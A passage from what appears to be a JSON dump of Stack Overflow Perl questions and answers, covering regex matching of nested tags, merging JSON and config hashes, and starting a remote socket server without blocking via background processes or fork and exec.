chars&lt;/tag3&gt;&lt;/tag2&gt;&lt;/tag1&gt;\n&lt;tag1&gt;&lt;tag2&gt;&lt;tag3&gt;Some randome chars&lt;/tag3&gt;&lt;tag3&gt;Some randome chars&lt;/tag3&gt;&lt;tag3&gt;Some randome chars&lt;/tag3&gt;&lt;/tag2&gt;&lt;/tag1&gt;\n&lt;tag1&gt;&lt;tag2&gt;&lt;tag3&gt;Some randome chars&lt;/tag3&gt;&lt;tag3&gt;Some randome chars&lt;/tag3&gt;&lt;/tag2&gt;&lt;/tag1&gt;\n&lt;tag1&gt;&lt;tag2&gt;&lt;tag3&gt;Some randome chars&lt;/tag3&gt;&lt;/tag2&gt;&lt;/tag1&gt;\n&lt;tag1&gt;&lt;tag2&gt;&lt;tag3&gt;Some randome chars&lt;/tag3&gt;&lt;tag3&gt;Some randome chars&lt;/tag3&gt;&lt;tag3&gt;Some randome chars&lt;/tag3&gt;&lt;tag3&gt;Some randome chars&lt;/tag3&gt;&lt;tag3&gt;Some randome chars&lt;/tag3&gt;&lt;tag3&gt;Some randome chars&lt;/tag3&gt;&lt;/tag2&gt;&lt;/tag1&gt;\n&lt;tag1&gt;&lt;tag2&gt;&lt;tag3&gt;Some randome chars&lt;/tag3&gt;&lt;tag3&gt;Some randome chars&lt;/tag3&gt;&lt;tag3&gt;Some randome chars&lt;/tag3&gt;&lt;tag3&gt;Some randome chars&lt;/tag3&gt;&lt;tag3&gt;Some randome chars&lt;/tag3&gt;&lt;/tag2&gt;&lt;/tag1&gt;\n&lt;tag1&gt;&lt;tag2&gt;&lt;tag3&gt;Some randome chars&lt;/tag3&gt;&lt;tag3&gt;Some randome chars&lt;/tag3&gt;&lt;tag3&gt;Some randome chars&lt;/tag3&gt;&lt;tag3&gt;Some randome chars&lt;/tag3&gt;&lt;/tag2&gt;&lt;/tag1&gt;\n</code></pre>\n\n<p>The match I want is: to match tag3 within tag2 which only appears once. </p>\n\n<p>For example:</p>\n\n<pre><code>&lt;tag2&gt;&lt;tag3&gt;something&lt;/tag3&gt;&lt;/tag2&gt; is matched\n&lt;tag2&gt;&lt;tag3&gt;something&lt;/tag3&gt;&lt;tag3&gt;something&lt;/tag3&gt;&lt;/tag2&gt; isn't matched\n</code></pre>\n\n<p>Based on above text, the expected output is: line 2 and 5.</p>\n\n<p>The regex I tried (didn't work): </p>\n\n<pre><code>&lt;tag2&gt;&lt;tag3&gt;(.*)?&lt;/tag3&gt;&lt;/tag2&gt;\n&lt;tag2&gt;&lt;tag3&gt;(.*){1}&lt;/tag3&gt;&lt;/tag2&gt;\n</code></pre>\n"}, {"tags": ["json", "perl", "hash"], "comments": [{"owner": {"reputation": 642, "user_id": 5010944, "user_type": "registered", "accept_rate": 60, "profile_image": "https://i.stack.imgur.com/CRK4V.jpg?s=128&g=1", "display_name": "Hemakumar", "link": "https://stackoverflow.com/users/5010944/hemakumar"}, "edited": false, "score": 0, "creation_date": 1466060563, "post_id": 37851153, "comment_id": 63162809, "body": "where and which.......... This two points are missed in your question. Where --&gt; server side or front end and Which language you are using."}, {"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "reply_to_user": {"reputation": 642, "user_id": 5010944, "user_type": "registered", "accept_rate": 60, "profile_image": "https://i.stack.imgur.com/CRK4V.jpg?s=128&g=1", "display_name": "Hemakumar", "link": "https://stackoverflow.com/users/5010944/hemakumar"}, "edited": false, "score": 3, "creation_date": 1466061345, "post_id": 37851153, "comment_id": 63163345, "body": "@Hema According to the tags and the question title, the OP is using Perl."}, {"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1466065009, "post_id": 37851153, "comment_id": 63165563, "body": "You should add the code you already have. How do you convert the files into hashes? What do the resulting data structures look like? Show them. You can <a href=\"https://stackoverflow.com/posts/37851153/edit\">edit</a> your question to add these details."}], "answers": [{"comments": [{"owner": {"reputation": 77, "user_id": 3354544, "user_type": "registered", "accept_rate": 42, "profile_image": "https://www.gravatar.com/avatar/6ecefba1d9ba5471f5cd16c183a696a1?s=128&d=identicon&r=PG&f=1", "display_name": "JustStarted", "link": "https://stackoverflow.com/users/3354544/juststarted"}, "edited": false, "score": 0, "creation_date": 1466067765, "post_id": 37853807, "comment_id": 63167383, "body": "Thanks @simbabque. I converted the files to hash in the same way you did. Sorry, I did not provide you with the code. Your answer seems to be giving the correct result, but I dont want to hard code those values. I have just given you a part of json. The json, that I am using, contains 5-10 categories like &#39;connection&#39; and then different sub categories. I cannot hard code all the categories. Also, I was thinking to compare the key from pid to json and when it matches, then get the value. I don&#39;t know how to compare key of different structured hashes."}, {"owner": {"reputation": 77, "user_id": 3354544, "user_type": "registered", "accept_rate": 42, "profile_image": "https://www.gravatar.com/avatar/6ecefba1d9ba5471f5cd16c183a696a1?s=128&d=identicon&r=PG&f=1", "display_name": "JustStarted", "link": "https://stackoverflow.com/users/3354544/juststarted"}, "edited": false, "score": 0, "creation_date": 1466067997, "post_id": 37853807, "comment_id": 63167558, "body": "Also, can we check in this code: <code>$cfg_json-&gt;{connection}-&gt;{file}-&gt;{file_connection_1}-&gt;{$key}</code> if value(hash reference name) before $key is equal to &#39;file_connection_1&#39; or second last value(hash reference name) equal to &#39;file&#39;?"}, {"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "reply_to_user": {"reputation": 77, "user_id": 3354544, "user_type": "registered", "accept_rate": 42, "profile_image": "https://www.gravatar.com/avatar/6ecefba1d9ba5471f5cd16c183a696a1?s=128&d=identicon&r=PG&f=1", "display_name": "JustStarted", "link": "https://stackoverflow.com/users/3354544/juststarted"}, "edited": false, "score": 0, "creation_date": 1466072811, "post_id": 37853807, "comment_id": 63170858, "body": "@JustStarted please update your question and include a second category in both of the files. You didn&#39;t mention that the categories are dynamic. I don&#39;t understand what you mean with your second comment. Try saying it in a different way."}], "tags": [], "owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "is_accepted": false, "score": 2, "last_activity_date": 1466065664, "creation_date": 1466065664, "answer_id": 37853807, "question_id": 37851153, "link": "https://stackoverflow.com/questions/37851153/making-json-to-hash-then-comparing-this-hash-with-another-hash-in-perl/37853807#37853807", "title": "Making json to hash, then comparing this hash with another hash in perl", "body": "<p>The way I understand the question, you have two hashes that have the same keys. If the first one does not have a value for a certain key, you want to put the value from the other hash there.</p>\n\n<p>Because you did not provide how you create those hashes, I came up with my own solution for that. You can probably disregard it. I used <a href=\"https://metacpan.org/pod/Config::General\" rel=\"nofollow\">Config::General</a> and some trickery to get rid of <code>\"</code> and <code>:</code> to read the pid file, and <a href=\"https://metacpan.org/pod/JSON\" rel=\"nofollow\">JSON</a> for the JSON.</p>\n\n<pre><code>use strict;\nuse warnings;\nuse Config::General;\nuse JSON 'decode_json';\nuse Data::Dumper;\n\n# read the pid file\nmy %cfg_pid = Config::General-&gt;new(\n    -NormalizeOption =&gt; sub { my $x = shift; $x =~ s/^\"|\":$//g; $x; }, \n    -NormalizeValue  =&gt; sub { my $x = shift; $x =~ s/^\"|\"$//g; $x },\n    -ConfigFile      =&gt; \\*DATA\n)-&gt;getall;\n\n# read the json file\nmy $json = &lt;&lt;'JSON';\n{\n \"connection\": {\n  \"file\": {\n   \"file_connection_1\": {\n    \"CLOUD_AUTHENTICATION\": \"\",\n    \"CLOUD_CONN_PROTOCOL\": \"\",\n    \"CONN_NAME\": \"file_connection_1\",\n    \"FILE_DIR\": \"/home/directory\"\n   }\n  }\n }\n}\nJSON\n\nmy $cfg_json = decode_json($json);\n\n# this is before\nprint Dumper $cfg_json;\n\n# actual part that you want\nforeach my $key ( keys %{ $cfg_pid{General} } ) {\n    $cfg_json-&gt;{connection}-&gt;{file}-&gt;{file_connection_1}-&gt;{$key} = $cfg_pid{General}-&gt;{$key}\n        unless $cfg_json-&gt;{connection}-&gt;{file}-&gt;{file_connection_1}-&gt;{$key};\n}\n\n# and this is after\nprint Dumper $cfg_json;\n\n__DATA__\n&lt;General&gt;\n \"CLOUD_AUTHENTICATION\": \"YES\"\n \"CLOUD_CONN_PROTOCOL\": \"PRTCL\"\n \"CONN_NAME\": \"file_connection_1\"\n \"FILE_DIR\": \"/home/directory\"\n&lt;/General&gt;\n</code></pre>\n\n<p>All it really does is iterate the keys of the pid file hash, and check in the json hash if there is a value of that key. If that value is not true (that means the key doesn't exist, the value is <code>undef</code>, an empty string <code>q{}</code> or <code>0</code>), it will set it to the value of the pid file hash. You could of course also check for empty string explicitly.</p>\n\n<p>The output is as follows.</p>\n\n<pre><code>$VAR1 = {\n    'connection' =&gt; {\n        'file' =&gt; {\n            'file_connection_1' =&gt; {\n                'FILE_DIR'             =&gt; '/home/directory',\n                'CONN_NAME'            =&gt; 'file_connection_1',\n                'CLOUD_CONN_PROTOCOL'  =&gt; '',\n                'CLOUD_AUTHENTICATION' =&gt; ''\n            }\n        }\n    }\n};\n$VAR1 = {\n    'connection' =&gt; {\n        'file' =&gt; {\n            'file_connection_1' =&gt; {\n                'FILE_DIR'             =&gt; '/home/directory',\n                'CONN_NAME'            =&gt; 'file_connection_1',\n                'CLOUD_CONN_PROTOCOL'  =&gt; 'PRTCL',\n                'CLOUD_AUTHENTICATION' =&gt; 'YES'\n            }\n        }\n    }\n};\n</code></pre>\n"}], "owner": {"reputation": 77, "user_id": 3354544, "user_type": "registered", "accept_rate": 42, "profile_image": "https://www.gravatar.com/avatar/6ecefba1d9ba5471f5cd16c183a696a1?s=128&d=identicon&r=PG&f=1", "display_name": "JustStarted", "link": "https://stackoverflow.com/users/3354544/juststarted"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 97, "favorite_count": 0, "closed_date": 1467278414, "answer_count": 1, "score": 0, "last_activity_date": 1466065664, "creation_date": 1466057340, "last_edit_date": 1466058040, "question_id": 37851153, "link": "https://stackoverflow.com/questions/37851153/making-json-to-hash-then-comparing-this-hash-with-another-hash-in-perl", "closed_reason": "Needs details or clarity", "title": "Making json to hash, then comparing this hash with another hash in perl", "body": "<p>I am having 2 files (json file and pid file). The format for json file is:</p>\n\n<pre><code>{\n \"connection\": {\n  \"file\": {\n   \"file_connection_1\": {\n    \"CLOUD_AUTHENTICATION\": \"\",\n    \"CLOUD_CONN_PROTOCOL\": \"\",\n    \"CONN_NAME\": \"file_connection_1\",\n    \"FILE_DIR\": \"/home/directory\"\n   }\n  }\n }\n}\n</code></pre>\n\n<p>Format for pid:</p>\n\n<pre><code>&lt;General&gt;\n \"CLOUD_AUTHENTICATION\": \"YES\"\n \"CLOUD_CONN_PROTOCOL\": \"PRTCL\"\n \"CONN_NAME\": \"file_connection_1\"\n \"FILE_DIR\": \"/home/directory\"\n&lt;/General&gt;\n</code></pre>\n\n<p>I want to convert both the files into hashes and then compare the values of the keys (eg. CLOUD_AUTHENTICATION or CLOUD_CONN_PROTOCOL...). Get the values from pid and insert them into json file hash, if not present.\nI am able to convert the files to hash, but not clear about how to compare the keys and copy the value from pid hash to json hash.</p>\n"}, {"tags": ["perl", "sockets", "fork", "system", "openssh"], "answers": [{"comments": [{"owner": {"reputation": 57, "user_id": 1814300, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/89276a0bf4a6744ed172bb2819dc348d?s=128&d=identicon&r=PG", "display_name": "hanish", "link": "https://stackoverflow.com/users/1814300/hanish"}, "edited": false, "score": 0, "creation_date": 1466059522, "post_id": 37850941, "comment_id": 63162205, "body": "Could you tell me how to fork and exit in perl : just like u said fire and forget types. could you share the code snippet for the same in perl"}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "reply_to_user": {"reputation": 57, "user_id": 1814300, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/89276a0bf4a6744ed172bb2819dc348d?s=128&d=identicon&r=PG", "display_name": "hanish", "link": "https://stackoverflow.com/users/1814300/hanish"}, "edited": false, "score": 0, "creation_date": 1466063303, "post_id": 37850941, "comment_id": 63164518, "body": "@hanish  Well, yes, sure.  However, that is a little different territory and I would have to request that you read up on that, too. It can get messed up if things go wrong.  There may well be another, simpler option -- I need to look at your code again and will let you know."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "reply_to_user": {"reputation": 57, "user_id": 1814300, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/89276a0bf4a6744ed172bb2819dc348d?s=128&d=identicon&r=PG", "display_name": "hanish", "link": "https://stackoverflow.com/users/1814300/hanish"}, "edited": false, "score": 0, "creation_date": 1466065624, "post_id": 37850941, "comment_id": 63165976, "body": "@hanish  I&#39;ve added a breakdown of (some) options to the post.  In particular, the easiest and simplest is if you can just start the driver (that starts the server) in the background.  Please let me know how it goes.  Learning <code>fork</code> + <code>exec</code>is nice but it may distract you from the job on hand."}, {"owner": {"reputation": 57, "user_id": 1814300, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/89276a0bf4a6744ed172bb2819dc348d?s=128&d=identicon&r=PG", "display_name": "hanish", "link": "https://stackoverflow.com/users/1814300/hanish"}, "edited": false, "score": 0, "creation_date": 1466067250, "post_id": 37850941, "comment_id": 63167037, "body": "yes its working now , thanks , i never knew about background processes in perl ( i knew of nohup) , its working now. :) nevertheless below i put a fork-exec case , please let me know where i go wrong with that."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "reply_to_user": {"reputation": 57, "user_id": 1814300, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/89276a0bf4a6744ed172bb2819dc348d?s=128&d=identicon&r=PG", "display_name": "hanish", "link": "https://stackoverflow.com/users/1814300/hanish"}, "edited": false, "score": 1, "creation_date": 1466228874, "post_id": 37850941, "comment_id": 63241416, "body": "@hanish  I added a <code>fork</code>+<code>exec</code> example, suited to your case, to my answer. If you want to use it <i>please first play a lot with it in a safe manner, to catch all those errors and weird behaviors without doing damage to your system (or others)</i>.  For the purpose at hand I recommend to use <code>test(&#39;cmd &amp;&#39;)</code>, since you say it&#39;s working.  Let me know how it goes."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "reply_to_user": {"reputation": 57, "user_id": 1814300, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/89276a0bf4a6744ed172bb2819dc348d?s=128&d=identicon&r=PG", "display_name": "hanish", "link": "https://stackoverflow.com/users/1814300/hanish"}, "edited": false, "score": 0, "creation_date": 1466748574, "post_id": 37850941, "comment_id": 63456670, "body": "@hanish  Please provide feedback on this extensive answer.  Did it solve your problem? How did the fork+exec work for you?"}], "tags": [], "owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "is_accepted": false, "score": 5, "last_activity_date": 1469785672, "last_edit_date": 1469785672, "creation_date": 1466056508, "answer_id": 37850941, "question_id": 37850684, "link": "https://stackoverflow.com/questions/37850684/perl-implementing-socket-programming-system-never-returns/37850941#37850941", "title": "Perl : implementing socket programming ( system() never returns)", "body": "<p><strong>Update</strong> &nbsp; Added <code>fork</code>+<code>exec</code> example, as asked for. Here I recommend <code>system('cmd &amp;')</code>.</p>\n\n<hr>\n\n<p>In short, your 'driver' <code>sabkuch.pl</code> starts the server using <code>exec</code> -- which  never returns.  From <a href=\"http://perldoc.perl.org/functions/exec.html\" rel=\"nofollow\"><code>exec</code></a></p>\n\n<blockquote>\n  <p>The \"exec\" function executes a system command and <strong>never returns</strong>; ...</p>\n</blockquote>\n\n<p>(Emphasis from the quoted documentation.)  Once an <code>exec</code> is used, the program running in the process is <em>replaced</em> by the other program, see <a href=\"https://en.wikipedia.org/wiki/Exec_%28system_call%29\" rel=\"nofollow\"><code>exec wiki</code></a>. If that server keeps running the <code>exit</code> you have there is never reached, that is unless there are errors.  See Perl's <code>exec</code> linked above.</p>\n\n<p>So your <code>$ssh-&gt;test()</code> will block forever (well, until the server does exit somehow). You need a <em>non-blocking</em> way to start the server.  Here are some options</p>\n\n<ul>\n<li><p>Run the driver in the background  </p>\n\n<pre><code>my $rc = $ssh-&gt;test('perl sabkuch.pl &amp;');\n</code></pre>\n\n<p>This starts a separate subshell and spawns <code>sabkuch.pl</code> in it, then returns control and <code>test</code> can complete. The <code>sabkuch.pl</code> runs <code>exec</code> and thus turns into the other program (the server), to run indefinitely. See <a href=\"http://perldoc.perl.org/perlipc.html#Background-Processes\" rel=\"nofollow\"><code>Background processes in perlipc</code></a>. Also see <a href=\"http://learn.perl.org/faq/perlfaq8.html#How-do-I-start-a-process-in-the-background\" rel=\"nofollow\"><code>it in perlfaq8</code></a>, and the many good links there. Note that there is no need for <code>perl ...</code> if <code>sabkuch.pl</code> can be made executable.</p></li>\n<li><p>See whether <code>Net::OpenSSH</code> has a method to execute commands so that it doesn't block.</p></li>\n<li><p>One way to 'fire-and-forget' is to <a href=\"http://perldoc.perl.org/functions/fork.html\" rel=\"nofollow\"><code>fork</code></a> and then <a href=\"http://perldoc.perl.org/functions/exec.html\" rel=\"nofollow\"><code>exec</code></a> in the child, while the parent exits (in this case). Then there is more to consider. Plenty of (compulsory) information is found in <a href=\"http://perldoc.perl.org/perlipc.html\" rel=\"nofollow\"><code>perlipc</code></a>. Examples abound elsewhere, search for <em>fork and exec</em>. This should not be taken lightly as errors can lead to bizarre behavior and untold consequences. Here is an example.  </p>\n\n<pre><code>#!/usr/bin/perl\nuse strict;\nuse warnings;               \nsystem('tar -xvf test.tar') == 0  or die \"Error with system(...): $!\";\n\nmy $pid = fork;\ndie \"Can't fork: $!\" if not defined $pid;\n# Two processes running now. For child $pid is 0, for parent large integer\n\nif ($pid == 0) {  # child, parent won't get into this block\n    exec('cd utpsm_run_automation &amp;&amp; perl utpsm_lts_server.pl');\n    die \"exec should've not returned: $!\";\n}   \n# Can only be parent here since child exec-ed and can't get here. Otherwise,\n# put parent-only code in else { } and wait for child or handle $SIG{CHLD}\nexit;\n</code></pre>\n\n<p>Normally a concern when forking is to <a href=\"http://perldoc.perl.org/functions/wait.html\" rel=\"nofollow\"><code>wait</code></a> for children. If we'd rather not, this can be solved by <em>double-forking</em> or by handling SIGCHLD (see <a href=\"http://perldoc.perl.org/functions/waitpid.html\" rel=\"nofollow\"><code>waitpid</code></a> as well), for example. Please study <code>perlfaq8</code> linked above, <a href=\"http://perldoc.perl.org/perlipc.html#Signals\" rel=\"nofollow\"><code>Signals in perlipc</code></a>, docs for all calls used, and everything else you can lay your hands on. In this case the parent should by all means exit first and the child process is then re-parented by <code>init</code> and all is well.  The <code>exec</code>-ed process gets the same <code>$pid</code> but since <code>cd</code> will trigger the shell (<code>sh -c cd</code>) the server will eventually run with a different PID.</p>\n\n<p>With <code>system('command &amp;')</code> we need not worry about waiting for a child.</p></li>\n</ul>\n\n<hr>\n\n<p>This is related only to your direct question, not the rest of the shown code.</p>\n"}, {"comments": [{"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 1, "creation_date": 1466067562, "post_id": 37854100, "comment_id": 63167235, "body": "Like I say, there is a little more to it. Your first test checks whether the <code>fork</code> failed, that&#39;s it.  There is no separation of child and parent so they <i>both</i> run through <code>else</code> and they <i>both</i> start the server -- and there is no one to return. Worse, you can accumulate processes (or zombies) if this goes wrong.. I&#39;d suggest you read a bit on it -- search SO and use links in my answer, and if there are problems post a question. I can add it to my answer as well, but that steers away from your purpose, which is better served by using simple <code>&amp;</code> behind the command."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1466071084, "post_id": 37854100, "comment_id": 63169708, "body": "<i>I&#39;d like to warn against playing with <code>fork</code> in production.</i>  For example, in this code you started <i>two server processes</i> to run in parallel. What if they, say, write files and stomp on each other in doing so, resulting in corrupt files? Or acquire some resource out of order? It can mess up your filesystem, or worse. By all means, play with it, but in small ways -- write separate programs. I can include it in my answer if you insist, but I am concerned about the health of your system. Please don&#39;t do it where it matters until you know it. Well, like any other code, just a bit more so."}, {"owner": {"reputation": 57, "user_id": 1814300, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/89276a0bf4a6744ed172bb2819dc348d?s=128&d=identicon&r=PG", "display_name": "hanish", "link": "https://stackoverflow.com/users/1814300/hanish"}, "reply_to_user": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1466152260, "post_id": 37854100, "comment_id": 63208714, "body": "@zdim, yes i think forking i would avoid it coz of possible danger you pointed, nevertheless if i had to have a code i want to know where its going wrong? could you please write a snippet for the same"}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1466152425, "post_id": 37854100, "comment_id": 63208817, "body": "Alright, I&#39;ll add it to my post. (I will <i>have to</i> do that some other day, it is very late here now.)  I will let you know when I get to it."}], "tags": [], "owner": {"reputation": 57, "user_id": 1814300, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/89276a0bf4a6744ed172bb2819dc348d?s=128&d=identicon&r=PG", "display_name": "hanish", "link": "https://stackoverflow.com/users/1814300/hanish"}, "is_accepted": false, "score": 0, "last_activity_date": 1466066502, "creation_date": 1466066502, "answer_id": 37854100, "question_id": 37850684, "link": "https://stackoverflow.com/questions/37850684/perl-implementing-socket-programming-system-never-returns/37854100#37854100", "title": "Perl : implementing socket programming ( system() never returns)", "body": "<p>Well i figured the best way would be to fork out a child process and parents exists thus child can now go on forever running the server.pl</p>\n\n<p>but it still is not working please let me knoe where in this code i am going wrong </p>\n\n<pre><code>#!/usr/bin/perl\n\nuse strict;\nuse warnings;\n\nsystem('tar -xvf test.tar');\n\nmy $child_pid = fork;\n\nif (!defined $child_pid){\n      print \"couldn't fork \\n\";}\n\nelse {\n        print \"in child , now executing \\n\";\nexec('cd utpsm_run_automation &amp;&amp; perl utpsm_lts_server.pl')\n        or die \"can't run server.pl in sabkuch child \\n\";\n}\n</code></pre>\n\n<p>the output is my script still hangs and the print statement \"in child now executing \" gets run twice , i dont understand why, \ni work mostly on assembly language hence this all is new to me.\nhelp will be appreciated.</p>\n"}], "owner": {"reputation": 57, "user_id": 1814300, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/89276a0bf4a6744ed172bb2819dc348d?s=128&d=identicon&r=PG", "display_name": "hanish", "link": "https://stackoverflow.com/users/1814300/hanish"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 203, "favorite_count": 1, "answer_count": 2, "score": 1, "last_activity_date": 1558334332, "creation_date": 1466055541, "last_edit_date": 1558334332, "question_id": 37850684, "link": "https://stackoverflow.com/questions/37850684/perl-implementing-socket-programming-system-never-returns", "title": "Perl : implementing socket programming ( system() never returns)", "body": "<p>My aim : implement socket programming such that client tries connecting to server if server not installed on remote machine , client(host) on its part transfers a tar file to server(target) machine and a perl script. This perl script untar the folder and runs a script (server perl script) , now the problem is : this server script has to run forever ( multiple clients ) until the machine restarts or something untoward happens.\nso the script runs properly : but since it is continuously running the control doesnt go back to the client which will again try to connect to the server ( on some predefined socket) , so basically i want that somehow i run the server but bring back control to my host which is client in this case.</p>\n\n<p>here is the code :</p>\n\n<pre><code>my $sourcedir = \"$homedir/host_client/test.tar\";\nmy $sourcedir2 = \"$homedir/host_client/sabkuch.pl\";\nmy $remote_path = \"/local/home/hanmaghu\";\n\n# Main subroutines\nmy $ssh = Net::OpenSSH-&gt;new ( $hostmachine, user =&gt;$username, password =&gt; $password);\n$ssh-&gt;scp_put($sourcedir,$sourcedir2,$remote_path)\n     or die \"scp failed \\n\" . $ssh-&gt;error;\n# test() is similar to system() in perl openssh package\nmy $rc = $ssh-&gt;test('perl sabkuch.pl'); \n# check if test function returned or not -&gt; this is never executed\nif ($rc == 1) {\n    print \"test was ok , server established \\n\";\n}\nelse {\n    print \"return from test = $rc \\n\";\n}\nexit;\n</code></pre>\n\n<p>The other script which invokes our server script is :</p>\n\n<pre><code>#!/usr/bin/perl\nuse strict;\nuse warnings;              \nsystem('tar -xvf test.tar');\nexec('cd utpsm_run_automation &amp;&amp; perl utpsm_lts_server.pl');\n#system('perl utpsm_lts_server.pl'); \n# Tried with system but in both cases it doesn't return, \n# this xxx_server.pl is my server script\nexit;\n</code></pre>\n\n<p>The server script is : </p>\n\n<pre><code>#!/usr/bin/perl\n\nuse strict;\nuse warnings;\nuse IO::Socket::INET;\n\n#flush after every write\n$| =1;\n\nmy $socket = new IO::Socket::INET (\n    LocalHost =&gt; '0.0.0.0',\n    LocalPort =&gt; '7783', \n    Proto =&gt; 'tcp',\n    Listen =&gt; 5,\n    Reuse =&gt; 1\n);\ndie \"cannot create socket $! \\n\" unless $socket;\nprint \"server waiting for client on port $socket-&gt;LocalPort \\n\";\n\nwhile (1)\n{\n    # waiting for new client connection\n    my $client_socket = $socket-&gt;accept();\n\n    # get info about new connected client\n    my $client_address = $client_socket-&gt;peerhost();\n    my $client_port = $client_socket-&gt;peerport();\n    print \"connection from $client_address:$client_port \\n\";\n\n    # read upto 1024 characters from connected client\n    my $data = \"\";\n    $client_socket-&gt;recv($data,1024);\n    print \"rceeived data = $data\";\n\n    # write response data to the connected client\n    $data = \"ok\";\n    $client_socket-&gt;send($data);\n\n    # notify client response is sent\n    shutdown($client_socket,1);\n}\n$socket-&gt;close();\n</code></pre>\n\n<p>Please help how to execute this : in terms of design this is what i want but having this issue while implementation, can i do it some other work around method.</p>\n"}, {"tags": ["perl", "hash"], "comments": [{"owner": {"reputation": 2509, "user_id": 4046274, "user_type": "registered", "accept_rate": 35, "profile_image": "https://i.stack.imgur.com/f4aeF.jpg?s=128&g=1", "display_name": "Pirate X", "link": "https://stackoverflow.com/users/4046274/pirate-x"}, "edited": false, "score": 2, "creation_date": 1466053807, "post_id": 37850317, "comment_id": 63159699, "body": "Share your code/workaround first."}, {"owner": {"reputation": 11, "user_id": 6472779, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/--IWEf4U8_u0/AAAAAAAAAAI/AAAAAAAAAFg/yv5_HR09i_0/photo.jpg?sz=128", "display_name": "Gaurav Sharma", "link": "https://stackoverflow.com/users/6472779/gaurav-sharma"}, "edited": false, "score": 0, "creation_date": 1466054377, "post_id": 37850317, "comment_id": 63159890, "body": "#!/grid/common/bin/perl use warnings; require (&quot;file.pl&quot;); while (my ($key, $val) = each %hash) {   print &quot;$key =&gt; $val\\n&quot;; }"}, {"owner": {"reputation": 11, "user_id": 6472779, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/--IWEf4U8_u0/AAAAAAAAAAI/AAAAAAAAAFg/yv5_HR09i_0/photo.jpg?sz=128", "display_name": "Gaurav Sharma", "link": "https://stackoverflow.com/users/6472779/gaurav-sharma"}, "edited": false, "score": 0, "creation_date": 1466054783, "post_id": 37850317, "comment_id": 63160031, "body": "#Pirate X please check the code"}, {"owner": {"reputation": 766, "user_id": 4445448, "user_type": "registered", "accept_rate": 47, "profile_image": "https://www.gravatar.com/avatar/3fbf664dc5d850436aac1fd98700c0ae?s=128&d=identicon&r=PG&f=1", "display_name": "SSN", "link": "https://stackoverflow.com/users/4445448/ssn"}, "edited": false, "score": 0, "creation_date": 1466059789, "post_id": 37850317, 